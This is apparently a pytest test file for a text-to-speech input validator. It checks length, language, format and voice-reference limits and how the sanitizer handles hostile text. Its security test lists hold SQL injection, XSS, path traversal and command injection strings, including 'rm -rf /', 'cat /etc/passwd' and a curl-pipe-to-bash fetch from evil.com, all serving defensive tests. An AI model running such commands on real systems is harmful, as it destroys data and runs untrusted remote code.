# test_tts_validation.py
# Description: Comprehensive tests for TTS validation system
#
# Imports
import pytest
from typing import Dict, Any
import tempfile
import os

#
# Local Imports
from tldw_Server_API.app.core.TTS import tts_validation
from tldw_Server_API.app.core.TTS.tts_validation import TTSInputValidator, validate_tts_request, ProviderLimits
from tldw_Server_API.app.core.TTS.adapters.base import TTSRequest, AudioFormat
from tldw_Server_API.app.core.TTS.tts_exceptions import (
    TTSValidationError,
    TTSTextTooLongError,
    TTSUnsupportedLanguageError,
    TTSUnsupportedFormatError,
    TTSInvalidInputError,
    TTSInvalidVoiceReferenceError,
)

#
#######################################################################################################################
#
# Test TTSInputValidator


class TestTTSInputValidator:
    """Test the TTSInputValidator class"""

    @pytest.fixture
    def validator(self):
        """Create a validator instance"""
        config = {
            "max_text_length": 5000,
            "allowed_languages": ["en", "es", "fr"],
            "max_voice_reference_size": 10 * 1024 * 1024,  # 10MB
            "strict_validation": True,  # Default to strict for most tests
        }
        return TTSInputValidator(config)

    @pytest.fixture
    def non_strict_validator(self):
        """Create a non-strict validator instance"""
        config = {
            "max_text_length": 5000,
            "allowed_languages": ["en", "es", "fr"],
            "max_voice_reference_size": 10 * 1024 * 1024,  # 10MB
            "strict_validation": False,  # Non-strict for sanitization tests
        }
        return TTSInputValidator(config)

    def test_sanitize_text_basic(self, validator):
        """Test basic text sanitization"""
        # Normal text should pass through
        text = "Hello, this is a test."
        assert validator.sanitize_text(text) == text

        # Whitespace normalization
        text = "Hello    world\n\n\ntest"
        expected = "Hello world\n\ntest"
        assert validator.sanitize_text(text) == expected

        # Unicode normalization
        text = "Héllo Wörld"
        assert validator.sanitize_text(text) == "Héllo Wörld"

    def test_sanitize_text_dangerous_patterns(self, non_strict_validator, validator):
        """Test removal of dangerous patterns"""
        # In strict mode, dangerous patterns raise an error
        text = "Hello <script>alert('xss')</script> world"
        with pytest.raises(TTSInvalidInputError):
            validator.sanitize_text(text)

        # In non-strict mode, dangerous patterns and HTML are removed
        sanitized = non_strict_validator.sanitize_text(text)
        assert "<script" not in sanitized
        assert "Hello world" == sanitized.strip()  # HTML tags removed

        # JavaScript URLs
        text = "Click here javascript:alert('xss')"
        with pytest.raises(TTSInvalidInputError):
            validator.sanitize_text(text)

        # Non-strict mode escapes it
        sanitized = non_strict_validator.sanitize_text(text)
        assert "javascript:" not in sanitized

        # SQL injection attempts - should be removed in non-strict mode
        text = "'; DROP TABLE users; --"
        sanitized = non_strict_validator.sanitize_text(text)
        # The dangerous pattern should be removed
        assert "DROP TABLE" not in sanitized

        # Command injection - non-strict mode removes dangerous patterns
        text = "test; rm -rf /"
        sanitized = non_strict_validator.sanitize_text(text)
        assert "rm -rf" not in sanitized

        # File path traversal - non-strict mode removes dangerous patterns
        text = "../../etc/passwd"
        sanitized = non_strict_validator.sanitize_text(text)
        assert "../.." not in sanitized

    def test_validate_text_length(self, validator):
        """Test text length validation"""
        # Valid length - use realistic text to avoid repetition check
        valid_text = "This is a test sentence. " * 4  # About 100 chars
        validator.validate_text_length(valid_text, max_length=200)

        # Too long - should raise
        long_text = "This is a test sentence. " * 20  # About 500 chars
        with pytest.raises(TTSTextTooLongError) as exc_info:
            validator.validate_text_length(long_text, max_length=200)

        error = exc_info.value
        assert error.details["max_length"] == 200
        assert error.details["text_length"] > 200  # Changed from actual_length

        # Empty text - should raise
        with pytest.raises(TTSInvalidInputError) as exc_info:
            validator.validate_text_length("", max_length=200)
        assert "empty" in str(exc_info.value).lower()

    def test_validate_language(self, validator):
        """Test language validation"""
        # Valid languages
        validator.validate_language("en", ["en", "es", "fr"])
        validator.validate_language("es", ["en", "es", "fr"])

        # Invalid language
        with pytest.raises(TTSUnsupportedLanguageError) as exc_info:
            validator.validate_language("de", ["en", "es", "fr"])

        error = exc_info.value
        assert error.details["requested_language"] == "de"
        assert set(error.details["supported_languages"]) == {"en", "es", "fr"}

        # None language should pass (uses default)
        validator.validate_language(None, ["en", "es"])

    def test_validate_format(self, validator):
        """Test audio format validation"""
        # Valid formats
        validator.validate_format(AudioFormat.MP3, {AudioFormat.MP3, AudioFormat.WAV})
        validator.validate_format(AudioFormat.WAV, {AudioFormat.MP3, AudioFormat.WAV})

        # Invalid format
        with pytest.raises(TTSUnsupportedFormatError) as exc_info:
            validator.validate_format(AudioFormat.OPUS, {AudioFormat.MP3, AudioFormat.WAV})

        error = exc_info.value
        assert error.details["requested_format"] == "opus"
        assert "mp3" in error.details["supported_formats"]
        assert "wav" in error.details["supported_formats"]

    def test_validate_parameters(self, validator):
        """Test parameter validation"""
        # Valid parameters
        request = TTSRequest(text="test", speed=1.0, pitch=0.0, volume=1.0)
        validator.validate_parameters(request)

        # Out of range speed - too low
        request_bad_speed = TTSRequest(text="test", speed=0.05, pitch=0.0, volume=1.0)
        with pytest.raises(TTSInvalidInputError) as exc_info:
            validator.validate_parameters(request_bad_speed)

        error = exc_info.value
        assert "Speed must be between 0.1 and 3.0" in str(error)

        # Out of range speed - too high
        request_bad_speed_high = TTSRequest(text="test", speed=5.0, pitch=0.0, volume=1.0)
        with pytest.raises(TTSInvalidInputError) as exc_info:
            validator.validate_parameters(request_bad_speed_high)

        error = exc_info.value
        assert "Speed must be between 0.1 and 3.0" in str(error)

    def test_validate_request_unexpected_error_log_sanitizes_exception_text(self, validator, monkeypatch):
        """Unexpected validation failures should not leak raw exception text to logs."""
        raw_error = "validation backend exploded"
        logged_messages: list[str] = []

        def fail_parameter_validation(request, provider=None):
            raise RuntimeError(raw_error)

        monkeypatch.setattr(validator, "_validate_parameters", fail_parameter_validation)
        request = TTSRequest(text="Hello world", voice="alloy", format=AudioFormat.MP3, speed=1.0)
        sink_id = tts_validation.logger.add(
            lambda message: logged_messages.append(message.record["message"]),
            level="ERROR",
        )
        try:
            is_valid, error_message = validator.validate_request(request, provider="openai")
        finally:
            tts_validation.logger.remove(sink_id)

        assert is_valid is False
        assert error_message == f"Validation failed: {raw_error}"
        assert any("Unexpected validation error" in message for message in logged_messages)
        assert all(raw_error not in message for message in logged_messages)

    def test_chatterbox_standard_rejects_non_english_language(self, validator):
        """Original Chatterbox remains English-only unless a multilingual model is requested."""
        request = TTSRequest(
            text="Bonjour tout le monde.",
            model="chatterbox",
            language="fr",
            format=AudioFormat.MP3,
        )

        is_valid, error_message = validator.validate_request(request, provider="chatterbox")

        assert is_valid is False
        assert error_message is not None
        assert "Language 'fr' not supported" in error_message

    def test_chatterbox_multilingual_model_accepts_supported_language(self, validator):
        """The multilingual Chatterbox model should validate known upstream language codes."""
        request = TTSRequest(
            text="Bonjour tout le monde.",
            model="chatterbox-multilingual",
            language="fr",
            format=AudioFormat.MP3,
        )

        is_valid, error_message = validator.validate_request(request, provider="chatterbox")

        assert is_valid is True
        assert error_message is None

    def test_chatterbox_turbo_is_english_only(self, validator):
        """Turbo is a separate Chatterbox family member but remains English-only upstream."""
        request = TTSRequest(
            text="Bonjour tout le monde.",
            model="chatterbox-turbo",
            language="fr",
            format=AudioFormat.MP3,
        )

        is_valid, error_message = validator.validate_request(request, provider="chatterbox")

        assert is_valid is False
        assert error_message is not None
        assert "Language 'fr' not supported" in error_message

    @pytest.mark.parametrize("audio_format", [AudioFormat.FLAC, AudioFormat.PCM])
    def test_chatterbox_accepts_adapter_advertised_formats(self, validator, audio_format):
        """Chatterbox validation should allow every format its adapter advertises."""
        request = TTSRequest(
            text="Hello from Chatterbox.",
            model="chatterbox",
            language="en",
            format=audio_format,
        )

        is_valid, error_message = validator.validate_request(request, provider="chatterbox")

        assert is_valid is True
        assert error_message is None

    def test_validate_voice_reference(self, validator):
        """Test voice reference validation"""
        # Valid WAV header
        valid_wav = b"RIFF" + b"\x00" * 4 + b"WAVE" + b"fmt " + b"\x00" * 100
        # Should not raise exception for valid audio
        validator.validate_voice_reference(valid_wav)

        # Valid MP3 header
        valid_mp3 = b"ID3" + b"\x00" * 100
        # Should not raise exception for valid audio
        validator.validate_voice_reference(valid_mp3)

        # Another MP3 format
        valid_mp3_2 = b"\xff\xfb" + b"\x00" * 100
        # Should not raise exception for valid audio
        validator.validate_voice_reference(valid_mp3_2)

        # Invalid format
        with pytest.raises(TTSInvalidVoiceReferenceError) as exc_info:
            validator.validate_voice_reference(b"INVALID" + b"\x00" * 100)

        assert "not a valid audio format" in str(exc_info.value)

        # Too large (create 51MB file, larger than 50MB limit)
        large_audio = b"RIFF" + b"\x00" * 4 + b"WAVE" + b"\x00" * (51 * 1024 * 1024)
        with pytest.raises(TTSInvalidVoiceReferenceError) as exc_info:
            validator.validate_voice_reference(large_audio)

        assert "too large" in str(exc_info.value).lower()


class TestProviderLimits:
    """Test provider-specific limits"""

    def test_get_provider_limits(self):
        """Test getting limits for different providers"""
        # OpenAI limits
        openai_limits = ProviderLimits.get_limits("openai")
        assert openai_limits["max_text_length"] == 4096
        assert "en" in openai_limits["languages"]
        assert "mp3" in openai_limits["valid_formats"]

        # Kokoro limits (no practical max; very large sentinel)
        kokoro_limits = ProviderLimits.get_limits("kokoro")
        assert kokoro_limits["max_text_length"] >= 100000
        assert "wav" in kokoro_limits["valid_formats"]

        # Unknown provider - should return defaults
        default_limits = ProviderLimits.get_limits("unknown_provider")
        assert default_limits["max_text_length"] == 5000
        assert "en" in default_limits["languages"]

        # Supertonic2 limits (multilingual)
        supertonic2_limits = ProviderLimits.get_limits("supertonic2")
        assert supertonic2_limits["max_text_length"] == 15000
        assert "ko" in supertonic2_limits["languages"]
        assert "wav" in supertonic2_limits["valid_formats"]

        kitten_limits = ProviderLimits.get_limits("kitten_tts")
        assert kitten_limits["max_text_length"] == 5000
        assert "pcm" in kitten_limits["valid_formats"]
        assert kitten_limits["max_speed"] == 4.0

        chatterbox_limits = ProviderLimits.get_limits("chatterbox")
        assert {"wav", "mp3", "opus", "flac", "pcm"}.issubset(chatterbox_limits["valid_formats"])

    def test_provider_specific_validation(self):
        """Test that provider limits are enforced"""
        # OpenAI text limit
        openai_limits = ProviderLimits.get_limits("openai")
        long_text = "a" * 5000  # Over OpenAI's 4096 limit

        validator = TTSInputValidator()
        with pytest.raises(TTSTextTooLongError) as exc_info:
            validator.validate_text_length(long_text, max_length=openai_limits["max_text_length"])

        assert exc_info.value.details["max_length"] == 4096


class TestValidateTTSRequest:
    """Test the main validation function"""

    def test_validate_basic_request(self):
        """Test validation of a basic valid request"""
        request = TTSRequest(text="Hello world", voice="alloy", format=AudioFormat.MP3, speed=1.0)

        # Should not raise
        validate_tts_request(request, provider="openai")

    def test_validate_with_provider_limits(self):
        """Test validation with provider-specific limits"""
        # Request within OpenAI limits - use varied text
        sample_text = "This is a sample text for testing. " * 120  # About 4080 chars
        request = TTSRequest(text=sample_text[:4000], voice="alloy", format=AudioFormat.MP3, language="en")
        validate_tts_request(request, provider="openai")

        # Request exceeding OpenAI limits
        long_text = "This is a longer sample text for testing limits. " * 120  # About 5000 chars
        request_too_long = TTSRequest(text=long_text[:5000], voice="alloy", format=AudioFormat.MP3)

        with pytest.raises(TTSValidationError) as exc_info:
            validate_tts_request(request_too_long, provider="openai")

        assert "exceeds maximum" in str(exc_info.value).lower()

    def test_validate_parameters(self):
        """Test parameter validation in request"""
        # Valid parameters
        request = TTSRequest(text="Test", speed=1.5, pitch=0.5, volume=0.8)
        validate_tts_request(request)

        # Invalid speed
        request_bad_speed = TTSRequest(text="Test", speed=10.0)  # Way too fast

        with pytest.raises(TTSValidationError) as exc_info:
            validate_tts_request(request_bad_speed)

        assert "speed" in str(exc_info.value).lower()

    def test_validate_supertonic2_limits(self):
        """Test provider-specific limits for Supertonic2"""
        # Unsupported language
        request_bad_lang = TTSRequest(
            text="Test",
            voice="supertonic2_m1",
            format=AudioFormat.MP3,
            language="de",
        )
        with pytest.raises(TTSValidationError) as exc_info:
            validate_tts_request(request_bad_lang, provider="supertonic2")
        assert "language" in str(exc_info.value).lower()

        # Speed outside allowed range
        request_bad_speed = TTSRequest(
            text="Test",
            voice="supertonic2_m1",
            format=AudioFormat.MP3,
            language="en",
            speed=0.8,
        )
        with pytest.raises(TTSValidationError) as exc_info:
            validate_tts_request(request_bad_speed, provider="supertonic2")
        assert "speed" in str(exc_info.value).lower()

    def test_validate_kitten_tts_limits(self):
        """KittenTTS should accept PCM output and the wider local speed range."""
        request = TTSRequest(
            text="Test",
            voice="Bella",
            format=AudioFormat.PCM,
            language="en",
            speed=4.0,
        )

        validate_tts_request(request, provider="kitten_tts")

    def test_validate_with_voice_reference(self):
        """Test validation with voice reference"""
        # Valid voice reference
        valid_audio = b"RIFF" + b"\x00" * 4 + b"WAVE" + b"\x00" * 1000
        request = TTSRequest(text="Test", voice_reference=valid_audio)
        validate_tts_request(request)

        # Invalid voice reference
        invalid_audio = b"INVALID" + b"\x00" * 1000
        request_invalid = TTSRequest(text="Test", voice_reference=invalid_audio)

        with pytest.raises(TTSValidationError) as exc_info:
            validate_tts_request(request_invalid)

        assert "voice reference" in str(exc_info.value).lower()

    def test_text_sanitization_in_validation(self):
        """Test that text is sanitized during validation"""
        # Text with dangerous patterns
        request = TTSRequest(text="Hello <script>alert('xss')</script> world", voice="alloy", format=AudioFormat.MP3)

        # Validation should sanitize the text
        validate_tts_request(request)

        # The text should be modified (sanitized)
        # Note: In actual implementation, validate_tts_request might modify the request
        # or return sanitized text. For this test, we're assuming it sanitizes in place.

    def test_empty_text_validation(self):
        """Test that empty text is rejected"""
        request = TTSRequest(text="", voice="alloy", format=AudioFormat.MP3)

        with pytest.raises(TTSValidationError) as exc_info:
            validate_tts_request(request)

        assert "empty" in str(exc_info.value).lower()

    def test_whitespace_only_text_validation(self):
        """Test that whitespace-only text is rejected"""
        request = TTSRequest(text="   \n\t  ", voice="alloy", format=AudioFormat.MP3)

        with pytest.raises(TTSValidationError) as exc_info:
            validate_tts_request(request)

        assert "empty" in str(exc_info.value).lower()


class TestSecurityValidation:
    """Test security-focused validation"""

    @pytest.fixture
    def validator(self):
        # Use non-strict mode for security tests
        return TTSInputValidator({"strict_validation": False})

    def test_sql_injection_prevention(self, validator):
        """Test prevention of SQL injection attempts"""
        sql_injections = ["'; DROP TABLE users; --", "1' OR '1'='1", "admin'--", "' UNION SELECT * FROM passwords --"]

        for injection in sql_injections:
            sanitized = validator.sanitize_text(injection)
            assert "DROP TABLE" not in sanitized.upper()
            assert "UNION SELECT" not in sanitized.upper()

    def test_command_injection_prevention(self, validator):
        """Test prevention of command injection"""
        command_injections = [
            "test; rm -rf /",
            "file & del C:\\*.*",
            "data | cat /etc/passwd",
            "user is `whoami`",
            "run $(curl evil.com/script.sh | bash) now",
        ]

        for injection in command_injections:
            sanitized = validator.sanitize_text(injection)
            assert "rm -rf" not in sanitized
            assert "del C:" not in sanitized
            assert "/etc/passwd" not in sanitized
            assert "whoami" not in sanitized
            assert "curl evil.com" not in sanitized

    def test_path_traversal_prevention(self, validator):
        """Test prevention of path traversal attacks"""
        path_traversals = ["../../etc/passwd", "..\\..\\windows\\system32", "file:///etc/passwd", "../../../etc/shadow"]

        for traversal in path_traversals:
            sanitized = validator.sanitize_text(traversal)
            assert "../.." not in sanitized
            assert "..\\.." not in sanitized

    def test_xss_prevention(self, validator):
        """Test prevention of XSS attacks"""
        xss_attempts = [
            "Hello <script>alert('XSS')</script> world",
            "Check this <img src=x onerror=alert('XSS')> image",
            "Visit <iframe src='javascript:alert(1)'> here",
            "Text <body onload=alert('XSS')> content",
            "Click here javascript:alert('XSS')",
            "Icon <svg/onload=alert('XSS')> display",
        ]

        for xss in xss_attempts:
            sanitized = validator.sanitize_text(xss)
            assert "<script" not in sanitized.lower()
            assert "javascript:" not in sanitized.lower()
            assert "onerror=" not in sanitized.lower()
            assert "onload=" not in sanitized.lower()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
